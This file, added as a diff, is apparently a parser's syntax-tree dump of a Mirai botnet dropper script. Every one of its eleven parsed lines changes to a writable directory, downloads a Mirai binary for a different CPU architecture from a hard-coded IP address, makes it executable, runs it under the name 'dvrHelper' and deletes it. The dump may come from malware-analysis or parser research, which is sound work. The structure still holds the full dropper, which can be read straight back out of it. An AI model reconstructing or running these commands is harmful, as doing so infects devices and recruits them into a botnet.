@@ -1,0 +1,539 @@
+ListNode(lineno=2, pos=(13, 178), parts=[
+  CommandNode(lineno=2, pos=(13, 20), parts=[
+    WordNode(lineno=2, pos=(13, 15), word='cd'),
+    WordNode(lineno=2, pos=(16, 20), word='/tmp'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(21, 23)),
+  CommandNode(lineno=2, pos=(24, 35), parts=[
+    WordNode(lineno=2, pos=(24, 26), word='cd'),
+    WordNode(lineno=2, pos=(27, 35), word='/var/run'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(36, 38)),
+  CommandNode(lineno=2, pos=(39, 46), parts=[
+    WordNode(lineno=2, pos=(39, 41), word='cd'),
+    WordNode(lineno=2, pos=(42, 46), word='/mnt'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(47, 49)),
+  CommandNode(lineno=2, pos=(50, 58), parts=[
+    WordNode(lineno=2, pos=(50, 52), word='cd'),
+    WordNode(lineno=2, pos=(53, 58), word='/root'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(59, 61)),
+  CommandNode(lineno=2, pos=(62, 66), parts=[
+    WordNode(lineno=2, pos=(62, 64), word='cd'),
+    WordNode(lineno=2, pos=(65, 66), word='/'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(66, 67)),
+  CommandNode(lineno=2, pos=(68, 126), parts=[
+    WordNode(lineno=2, pos=(68, 72), word='wget'),
+    WordNode(lineno=2, pos=(73, 113), word='http://103.26.76.44:5000/sdvss/mirai.arm'),
+    WordNode(lineno=2, pos=(114, 116), word='-O'),
+    WordNode(lineno=2, pos=(117, 126), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(126, 127)),
+  CommandNode(lineno=2, pos=(128, 146), parts=[
+    WordNode(lineno=2, pos=(128, 133), word='chmod'),
+    WordNode(lineno=2, pos=(134, 136), word='+x'),
+    WordNode(lineno=2, pos=(137, 146), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(146, 147)),
+  CommandNode(lineno=2, pos=(148, 159), parts=[
+    WordNode(lineno=2, pos=(148, 159), word='./dvrHelper'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(159, 160)),
+  CommandNode(lineno=2, pos=(161, 178), parts=[
+    WordNode(lineno=2, pos=(161, 163), word='rm'),
+    WordNode(lineno=2, pos=(164, 167), word='-rf'),
+    WordNode(lineno=2, pos=(168, 178), word='dvrHelper\r'),
+  ]),
+])
+ListNode(lineno=3, pos=(179, 345), parts=[
+  CommandNode(lineno=3, pos=(179, 186), parts=[
+    WordNode(lineno=3, pos=(179, 181), word='cd'),
+    WordNode(lineno=3, pos=(182, 186), word='/tmp'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(187, 189)),
+  CommandNode(lineno=3, pos=(190, 201), parts=[
+    WordNode(lineno=3, pos=(190, 192), word='cd'),
+    WordNode(lineno=3, pos=(193, 201), word='/var/run'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(202, 204)),
+  CommandNode(lineno=3, pos=(205, 212), parts=[
+    WordNode(lineno=3, pos=(205, 207), word='cd'),
+    WordNode(lineno=3, pos=(208, 212), word='/mnt'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(213, 215)),
+  CommandNode(lineno=3, pos=(216, 224), parts=[
+    WordNode(lineno=3, pos=(216, 218), word='cd'),
+    WordNode(lineno=3, pos=(219, 224), word='/root'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(225, 227)),
+  CommandNode(lineno=3, pos=(228, 232), parts=[
+    WordNode(lineno=3, pos=(228, 230), word='cd'),
+    WordNode(lineno=3, pos=(231, 232), word='/'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(232, 233)),
+  CommandNode(lineno=3, pos=(234, 293), parts=[
+    WordNode(lineno=3, pos=(234, 238), word='wget'),
+    WordNode(lineno=3, pos=(239, 280), word='http://103.26.76.44:5000/sdvss/mirai.m68k'),
+    WordNode(lineno=3, pos=(281, 283), word='-O'),
+    WordNode(lineno=3, pos=(284, 293), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(293, 294)),
+  CommandNode(lineno=3, pos=(295, 313), parts=[
+    WordNode(lineno=3, pos=(295, 300), word='chmod'),
+    WordNode(lineno=3, pos=(301, 303), word='+x'),
+    WordNode(lineno=3, pos=(304, 313), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(313, 314)),
+  CommandNode(lineno=3, pos=(315, 326), parts=[
+    WordNode(lineno=3, pos=(315, 326), word='./dvrHelper'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(326, 327)),
+  CommandNode(lineno=3, pos=(328, 345), parts=[
+    WordNode(lineno=3, pos=(328, 330), word='rm'),
+    WordNode(lineno=3, pos=(331, 334), word='-rf'),
+    WordNode(lineno=3, pos=(335, 345), word='dvrHelper\r'),
+  ]),
+])
+ListNode(lineno=4, pos=(346, 512), parts=[
+  CommandNode(lineno=4, pos=(346, 353), parts=[
+    WordNode(lineno=4, pos=(346, 348), word='cd'),
+    WordNode(lineno=4, pos=(349, 353), word='/tmp'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(354, 356)),
+  CommandNode(lineno=4, pos=(357, 368), parts=[
+    WordNode(lineno=4, pos=(357, 359), word='cd'),
+    WordNode(lineno=4, pos=(360, 368), word='/var/run'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(369, 371)),
+  CommandNode(lineno=4, pos=(372, 379), parts=[
+    WordNode(lineno=4, pos=(372, 374), word='cd'),
+    WordNode(lineno=4, pos=(375, 379), word='/mnt'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(380, 382)),
+  CommandNode(lineno=4, pos=(383, 391), parts=[
+    WordNode(lineno=4, pos=(383, 385), word='cd'),
+    WordNode(lineno=4, pos=(386, 391), word='/root'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(392, 394)),
+  CommandNode(lineno=4, pos=(395, 399), parts=[
+    WordNode(lineno=4, pos=(395, 397), word='cd'),
+    WordNode(lineno=4, pos=(398, 399), word='/'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(399, 400)),
+  CommandNode(lineno=4, pos=(401, 460), parts=[
+    WordNode(lineno=4, pos=(401, 405), word='wget'),
+    WordNode(lineno=4, pos=(406, 447), word='http://103.26.76.44:5000/sdvss/mirai.mips'),
+    WordNode(lineno=4, pos=(448, 450), word='-O'),
+    WordNode(lineno=4, pos=(451, 460), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(460, 461)),
+  CommandNode(lineno=4, pos=(462, 480), parts=[
+    WordNode(lineno=4, pos=(462, 467), word='chmod'),
+    WordNode(lineno=4, pos=(468, 470), word='+x'),
+    WordNode(lineno=4, pos=(471, 480), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(480, 481)),
+  CommandNode(lineno=4, pos=(482, 493), parts=[
+    WordNode(lineno=4, pos=(482, 493), word='./dvrHelper'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(493, 494)),
+  CommandNode(lineno=4, pos=(495, 512), parts=[
+    WordNode(lineno=4, pos=(495, 497), word='rm'),
+    WordNode(lineno=4, pos=(498, 501), word='-rf'),
+    WordNode(lineno=4, pos=(502, 512), word='dvrHelper\r'),
+  ]),
+])
+ListNode(lineno=5, pos=(513, 679), parts=[
+  CommandNode(lineno=5, pos=(513, 520), parts=[
+    WordNode(lineno=5, pos=(513, 515), word='cd'),
+    WordNode(lineno=5, pos=(516, 520), word='/tmp'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(521, 523)),
+  CommandNode(lineno=5, pos=(524, 535), parts=[
+    WordNode(lineno=5, pos=(524, 526), word='cd'),
+    WordNode(lineno=5, pos=(527, 535), word='/var/run'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(536, 538)),
+  CommandNode(lineno=5, pos=(539, 546), parts=[
+    WordNode(lineno=5, pos=(539, 541), word='cd'),
+    WordNode(lineno=5, pos=(542, 546), word='/mnt'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(547, 549)),
+  CommandNode(lineno=5, pos=(550, 558), parts=[
+    WordNode(lineno=5, pos=(550, 552), word='cd'),
+    WordNode(lineno=5, pos=(553, 558), word='/root'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(559, 561)),
+  CommandNode(lineno=5, pos=(562, 566), parts=[
+    WordNode(lineno=5, pos=(562, 564), word='cd'),
+    WordNode(lineno=5, pos=(565, 566), word='/'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(566, 567)),
+  CommandNode(lineno=5, pos=(568, 627), parts=[
+    WordNode(lineno=5, pos=(568, 572), word='wget'),
+    WordNode(lineno=5, pos=(573, 614), word='http://103.26.76.44:5000/sdvss/mirai.mpsl'),
+    WordNode(lineno=5, pos=(615, 617), word='-O'),
+    WordNode(lineno=5, pos=(618, 627), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(627, 628)),
+  CommandNode(lineno=5, pos=(629, 647), parts=[
+    WordNode(lineno=5, pos=(629, 634), word='chmod'),
+    WordNode(lineno=5, pos=(635, 637), word='+x'),
+    WordNode(lineno=5, pos=(638, 647), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(647, 648)),
+  CommandNode(lineno=5, pos=(649, 660), parts=[
+    WordNode(lineno=5, pos=(649, 660), word='./dvrHelper'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(660, 661)),
+  CommandNode(lineno=5, pos=(662, 679), parts=[
+    WordNode(lineno=5, pos=(662, 664), word='rm'),
+    WordNode(lineno=5, pos=(665, 668), word='-rf'),
+    WordNode(lineno=5, pos=(669, 679), word='dvrHelper\r'),
+  ]),
+])
+ListNode(lineno=6, pos=(680, 845), parts=[
+  CommandNode(lineno=6, pos=(680, 687), parts=[
+    WordNode(lineno=6, pos=(680, 682), word='cd'),
+    WordNode(lineno=6, pos=(683, 687), word='/tmp'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(688, 690)),
+  CommandNode(lineno=6, pos=(691, 702), parts=[
+    WordNode(lineno=6, pos=(691, 693), word='cd'),
+    WordNode(lineno=6, pos=(694, 702), word='/var/run'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(703, 705)),
+  CommandNode(lineno=6, pos=(706, 713), parts=[
+    WordNode(lineno=6, pos=(706, 708), word='cd'),
+    WordNode(lineno=6, pos=(709, 713), word='/mnt'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(714, 716)),
+  CommandNode(lineno=6, pos=(717, 725), parts=[
+    WordNode(lineno=6, pos=(717, 719), word='cd'),
+    WordNode(lineno=6, pos=(720, 725), word='/root'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(726, 728)),
+  CommandNode(lineno=6, pos=(729, 733), parts=[
+    WordNode(lineno=6, pos=(729, 731), word='cd'),
+    WordNode(lineno=6, pos=(732, 733), word='/'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(733, 734)),
+  CommandNode(lineno=6, pos=(735, 793), parts=[
+    WordNode(lineno=6, pos=(735, 739), word='wget'),
+    WordNode(lineno=6, pos=(740, 780), word='http://103.26.76.44:5000/sdvss/mirai.x86'),
+    WordNode(lineno=6, pos=(781, 783), word='-O'),
+    WordNode(lineno=6, pos=(784, 793), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(793, 794)),
+  CommandNode(lineno=6, pos=(795, 813), parts=[
+    WordNode(lineno=6, pos=(795, 800), word='chmod'),
+    WordNode(lineno=6, pos=(801, 803), word='+x'),
+    WordNode(lineno=6, pos=(804, 813), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(813, 814)),
+  CommandNode(lineno=6, pos=(815, 826), parts=[
+    WordNode(lineno=6, pos=(815, 826), word='./dvrHelper'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(826, 827)),
+  CommandNode(lineno=6, pos=(828, 845), parts=[
+    WordNode(lineno=6, pos=(828, 830), word='rm'),
+    WordNode(lineno=6, pos=(831, 834), word='-rf'),
+    WordNode(lineno=6, pos=(835, 845), word='dvrHelper\r'),
+  ]),
+])
+ListNode(lineno=7, pos=(846, 1011), parts=[
+  CommandNode(lineno=7, pos=(846, 853), parts=[
+    WordNode(lineno=7, pos=(846, 848), word='cd'),
+    WordNode(lineno=7, pos=(849, 853), word='/tmp'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(854, 856)),
+  CommandNode(lineno=7, pos=(857, 868), parts=[
+    WordNode(lineno=7, pos=(857, 859), word='cd'),
+    WordNode(lineno=7, pos=(860, 868), word='/var/run'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(869, 871)),
+  CommandNode(lineno=7, pos=(872, 879), parts=[
+    WordNode(lineno=7, pos=(872, 874), word='cd'),
+    WordNode(lineno=7, pos=(875, 879), word='/mnt'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(880, 882)),
+  CommandNode(lineno=7, pos=(883, 891), parts=[
+    WordNode(lineno=7, pos=(883, 885), word='cd'),
+    WordNode(lineno=7, pos=(886, 891), word='/root'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(892, 894)),
+  CommandNode(lineno=7, pos=(895, 899), parts=[
+    WordNode(lineno=7, pos=(895, 897), word='cd'),
+    WordNode(lineno=7, pos=(898, 899), word='/'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(899, 900)),
+  CommandNode(lineno=7, pos=(901, 959), parts=[
+    WordNode(lineno=7, pos=(901, 905), word='wget'),
+    WordNode(lineno=7, pos=(906, 946), word='http://103.26.76.44:5000/sdvss/mirai.spc'),
+    WordNode(lineno=7, pos=(947, 949), word='-O'),
+    WordNode(lineno=7, pos=(950, 959), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(959, 960)),
+  CommandNode(lineno=7, pos=(961, 979), parts=[
+    WordNode(lineno=7, pos=(961, 966), word='chmod'),
+    WordNode(lineno=7, pos=(967, 969), word='+x'),
+    WordNode(lineno=7, pos=(970, 979), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(979, 980)),
+  CommandNode(lineno=7, pos=(981, 992), parts=[
+    WordNode(lineno=7, pos=(981, 992), word='./dvrHelper'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(992, 993)),
+  CommandNode(lineno=7, pos=(994, 1011), parts=[
+    WordNode(lineno=7, pos=(994, 996), word='rm'),
+    WordNode(lineno=7, pos=(997, 1000), word='-rf'),
+    WordNode(lineno=7, pos=(1001, 1011), word='dvrHelper\r'),
+  ]),
+])
+ListNode(lineno=8, pos=(1012, 1178), parts=[
+  CommandNode(lineno=8, pos=(1012, 1019), parts=[
+    WordNode(lineno=8, pos=(1012, 1014), word='cd'),
+    WordNode(lineno=8, pos=(1015, 1019), word='/tmp'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1020, 1022)),
+  CommandNode(lineno=8, pos=(1023, 1034), parts=[
+    WordNode(lineno=8, pos=(1023, 1025), word='cd'),
+    WordNode(lineno=8, pos=(1026, 1034), word='/var/run'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1035, 1037)),
+  CommandNode(lineno=8, pos=(1038, 1045), parts=[
+    WordNode(lineno=8, pos=(1038, 1040), word='cd'),
+    WordNode(lineno=8, pos=(1041, 1045), word='/mnt'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1046, 1048)),
+  CommandNode(lineno=8, pos=(1049, 1057), parts=[
+    WordNode(lineno=8, pos=(1049, 1051), word='cd'),
+    WordNode(lineno=8, pos=(1052, 1057), word='/root'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1058, 1060)),
+  CommandNode(lineno=8, pos=(1061, 1065), parts=[
+    WordNode(lineno=8, pos=(1061, 1063), word='cd'),
+    WordNode(lineno=8, pos=(1064, 1065), word='/'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1065, 1066)),
+  CommandNode(lineno=8, pos=(1067, 1126), parts=[
+    WordNode(lineno=8, pos=(1067, 1071), word='wget'),
+    WordNode(lineno=8, pos=(1072, 1113), word='http://103.26.76.44:5000/sdvss/mirai.arm7'),
+    WordNode(lineno=8, pos=(1114, 1116), word='-O'),
+    WordNode(lineno=8, pos=(1117, 1126), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1126, 1127)),
+  CommandNode(lineno=8, pos=(1128, 1146), parts=[
+    WordNode(lineno=8, pos=(1128, 1133), word='chmod'),
+    WordNode(lineno=8, pos=(1134, 1136), word='+x'),
+    WordNode(lineno=8, pos=(1137, 1146), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1146, 1147)),
+  CommandNode(lineno=8, pos=(1148, 1159), parts=[
+    WordNode(lineno=8, pos=(1148, 1159), word='./dvrHelper'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1159, 1160)),
+  CommandNode(lineno=8, pos=(1161, 1178), parts=[
+    WordNode(lineno=8, pos=(1161, 1163), word='rm'),
+    WordNode(lineno=8, pos=(1164, 1167), word='-rf'),
+    WordNode(lineno=8, pos=(1168, 1178), word='dvrHelper\r'),
+  ]),
+])
+ListNode(lineno=9, pos=(1179, 1346), parts=[
+  CommandNode(lineno=9, pos=(1179, 1186), parts=[
+    WordNode(lineno=9, pos=(1179, 1181), word='cd'),
+    WordNode(lineno=9, pos=(1182, 1186), word='/tmp'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1187, 1189)),
+  CommandNode(lineno=9, pos=(1190, 1201), parts=[
+    WordNode(lineno=9, pos=(1190, 1192), word='cd'),
+    WordNode(lineno=9, pos=(1193, 1201), word='/var/run'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1202, 1204)),
+  CommandNode(lineno=9, pos=(1205, 1212), parts=[
+    WordNode(lineno=9, pos=(1205, 1207), word='cd'),
+    WordNode(lineno=9, pos=(1208, 1212), word='/mnt'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1213, 1215)),
+  CommandNode(lineno=9, pos=(1216, 1224), parts=[
+    WordNode(lineno=9, pos=(1216, 1218), word='cd'),
+    WordNode(lineno=9, pos=(1219, 1224), word='/root'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1225, 1227)),
+  CommandNode(lineno=9, pos=(1228, 1232), parts=[
+    WordNode(lineno=9, pos=(1228, 1230), word='cd'),
+    WordNode(lineno=9, pos=(1231, 1232), word='/'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1232, 1233)),
+  CommandNode(lineno=9, pos=(1234, 1294), parts=[
+    WordNode(lineno=9, pos=(1234, 1238), word='wget'),
+    WordNode(lineno=9, pos=(1239, 1281), word='http://103.26.76.44:5000/sdvss/mirai.arm5n'),
+    WordNode(lineno=9, pos=(1282, 1284), word='-O'),
+    WordNode(lineno=9, pos=(1285, 1294), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1294, 1295)),
+  CommandNode(lineno=9, pos=(1296, 1314), parts=[
+    WordNode(lineno=9, pos=(1296, 1301), word='chmod'),
+    WordNode(lineno=9, pos=(1302, 1304), word='+x'),
+    WordNode(lineno=9, pos=(1305, 1314), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1314, 1315)),
+  CommandNode(lineno=9, pos=(1316, 1327), parts=[
+    WordNode(lineno=9, pos=(1316, 1327), word='./dvrHelper'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1327, 1328)),
+  CommandNode(lineno=9, pos=(1329, 1346), parts=[
+    WordNode(lineno=9, pos=(1329, 1331), word='rm'),
+    WordNode(lineno=9, pos=(1332, 1335), word='-rf'),
+    WordNode(lineno=9, pos=(1336, 1346), word='dvrHelper\r'),
+  ]),
+])
+ListNode(lineno=10, pos=(1347, 1512), parts=[
+  CommandNode(lineno=10, pos=(1347, 1354), parts=[
+    WordNode(lineno=10, pos=(1347, 1349), word='cd'),
+    WordNode(lineno=10, pos=(1350, 1354), word='/tmp'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1355, 1357)),
+  CommandNode(lineno=10, pos=(1358, 1369), parts=[
+    WordNode(lineno=10, pos=(1358, 1360), word='cd'),
+    WordNode(lineno=10, pos=(1361, 1369), word='/var/run'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1370, 1372)),
+  CommandNode(lineno=10, pos=(1373, 1380), parts=[
+    WordNode(lineno=10, pos=(1373, 1375), word='cd'),
+    WordNode(lineno=10, pos=(1376, 1380), word='/mnt'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1381, 1383)),
+  CommandNode(lineno=10, pos=(1384, 1392), parts=[
+    WordNode(lineno=10, pos=(1384, 1386), word='cd'),
+    WordNode(lineno=10, pos=(1387, 1392), word='/root'),
+  ]),
+  OperatorNode(lineno=10, op='||', pos=(1393, 1395)),
+  CommandNode(lineno=10, pos=(1396, 1400), parts=[
+    WordNode(lineno=10, pos=(1396, 1398), word='cd'),
+    WordNode(lineno=10, pos=(1399, 1400), word='/'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1400, 1401)),
+  CommandNode(lineno=10, pos=(1402, 1460), parts=[
+    WordNode(lineno=10, pos=(1402, 1406), word='wget'),
+    WordNode(lineno=10, pos=(1407, 1447), word='http://103.26.76.44:5000/sdvss/mirai.arm'),
+    WordNode(lineno=10, pos=(1448, 1450), word='-O'),
+    WordNode(lineno=10, pos=(1451, 1460), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1460, 1461)),
+  CommandNode(lineno=10, pos=(1462, 1480), parts=[
+    WordNode(lineno=10, pos=(1462, 1467), word='chmod'),
+    WordNode(lineno=10, pos=(1468, 1470), word='+x'),
+    WordNode(lineno=10, pos=(1471, 1480), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1480, 1481)),
+  CommandNode(lineno=10, pos=(1482, 1493), parts=[
+    WordNode(lineno=10, pos=(1482, 1493), word='./dvrHelper'),
+  ]),
+  OperatorNode(lineno=10, op=';', pos=(1493, 1494)),
+  CommandNode(lineno=10, pos=(1495, 1512), parts=[
+    WordNode(lineno=10, pos=(1495, 1497), word='rm'),
+    WordNode(lineno=10, pos=(1498, 1501), word='-rf'),
+    WordNode(lineno=10, pos=(1502, 1512), word='dvrHelper\r'),
+  ]),
+])
+ListNode(lineno=11, pos=(1513, 1678), parts=[
+  CommandNode(lineno=11, pos=(1513, 1520), parts=[
+    WordNode(lineno=11, pos=(1513, 1515), word='cd'),
+    WordNode(lineno=11, pos=(1516, 1520), word='/tmp'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1521, 1523)),
+  CommandNode(lineno=11, pos=(1524, 1535), parts=[
+    WordNode(lineno=11, pos=(1524, 1526), word='cd'),
+    WordNode(lineno=11, pos=(1527, 1535), word='/var/run'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1536, 1538)),
+  CommandNode(lineno=11, pos=(1539, 1546), parts=[
+    WordNode(lineno=11, pos=(1539, 1541), word='cd'),
+    WordNode(lineno=11, pos=(1542, 1546), word='/mnt'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1547, 1549)),
+  CommandNode(lineno=11, pos=(1550, 1558), parts=[
+    WordNode(lineno=11, pos=(1550, 1552), word='cd'),
+    WordNode(lineno=11, pos=(1553, 1558), word='/root'),
+  ]),
+  OperatorNode(lineno=11, op='||', pos=(1559, 1561)),
+  CommandNode(lineno=11, pos=(1562, 1566), parts=[
+    WordNode(lineno=11, pos=(1562, 1564), word='cd'),
+    WordNode(lineno=11, pos=(1565, 1566), word='/'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1566, 1567)),
+  CommandNode(lineno=11, pos=(1568, 1626), parts=[
+    WordNode(lineno=11, pos=(1568, 1572), word='wget'),
+    WordNode(lineno=11, pos=(1573, 1613), word='http://103.26.76.44:5000/sdvss/mirai.ppc'),
+    WordNode(lineno=11, pos=(1614, 1616), word='-O'),
+    WordNode(lineno=11, pos=(1617, 1626), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1626, 1627)),
+  CommandNode(lineno=11, pos=(1628, 1646), parts=[
+    WordNode(lineno=11, pos=(1628, 1633), word='chmod'),
+    WordNode(lineno=11, pos=(1634, 1636), word='+x'),
+    WordNode(lineno=11, pos=(1637, 1646), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1646, 1647)),
+  CommandNode(lineno=11, pos=(1648, 1659), parts=[
+    WordNode(lineno=11, pos=(1648, 1659), word='./dvrHelper'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(1659, 1660)),
+  CommandNode(lineno=11, pos=(1661, 1678), parts=[
+    WordNode(lineno=11, pos=(1661, 1663), word='rm'),
+    WordNode(lineno=11, pos=(1664, 1667), word='-rf'),
+    WordNode(lineno=11, pos=(1668, 1678), word='dvrHelper\r'),
+  ]),
+])
+ListNode(lineno=12, pos=(1679, 1844), parts=[
+  CommandNode(lineno=12, pos=(1679, 1686), parts=[
+    WordNode(lineno=12, pos=(1679, 1681), word='cd'),
+    WordNode(lineno=12, pos=(1682, 1686), word='/tmp'),
+  ]),
+  OperatorNode(lineno=12, op='||', pos=(1687, 1689)),
+  CommandNode(lineno=12, pos=(1690, 1701), parts=[
+    WordNode(lineno=12, pos=(1690, 1692), word='cd'),
+    WordNode(lineno=12, pos=(1693, 1701), word='/var/run'),
+  ]),
+  OperatorNode(lineno=12, op='||', pos=(1702, 1704)),
+  CommandNode(lineno=12, pos=(1705, 1712), parts=[
+    WordNode(lineno=12, pos=(1705, 1707), word='cd'),
+    WordNode(lineno=12, pos=(1708, 1712), word='/mnt'),
+  ]),
+  OperatorNode(lineno=12, op='||', pos=(1713, 1715)),
+  CommandNode(lineno=12, pos=(1716, 1724), parts=[
+    WordNode(lineno=12, pos=(1716, 1718), word='cd'),
+    WordNode(lineno=12, pos=(1719, 1724), word='/root'),
+  ]),
+  OperatorNode(lineno=12, op='||', pos=(1725, 1727)),
+  CommandNode(lineno=12, pos=(1728, 1732), parts=[
+    WordNode(lineno=12, pos=(1728, 1730), word='cd'),
+    WordNode(lineno=12, pos=(1731, 1732), word='/'),
+  ]),
+  OperatorNode(lineno=12, op=';', pos=(1732, 1733)),
+  CommandNode(lineno=12, pos=(1734, 1792), parts=[
+    WordNode(lineno=12, pos=(1734, 1738), word='wget'),
+    WordNode(lineno=12, pos=(1739, 1779), word='http://103.26.76.44:5000/sdvss/mirai.sh4'),
+    WordNode(lineno=12, pos=(1780, 1782), word='-O'),
+    WordNode(lineno=12, pos=(1783, 1792), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=12, op=';', pos=(1792, 1793)),
+  CommandNode(lineno=12, pos=(1794, 1812), parts=[
+    WordNode(lineno=12, pos=(1794, 1799), word='chmod'),
+    WordNode(lineno=12, pos=(1800, 1802), word='+x'),
+    WordNode(lineno=12, pos=(1803, 1812), word='dvrHelper'),
+  ]),
+  OperatorNode(lineno=12, op=';', pos=(1812, 1813)),
+  CommandNode(lineno=12, pos=(1814, 1825), parts=[
+    WordNode(lineno=12, pos=(1814, 1825), word='./dvrHelper'),
+  ]),
+  OperatorNode(lineno=12, op=';', pos=(1825, 1826)),
+  CommandNode(lineno=12, pos=(1827, 1844), parts=[
+    WordNode(lineno=12, pos=(1827, 1829), word='rm'),
+    WordNode(lineno=12, pos=(1830, 1833), word='-rf'),
+    WordNode(lineno=12, pos=(1834, 1844), word='dvrHelper\r'),
+  ]),
+])
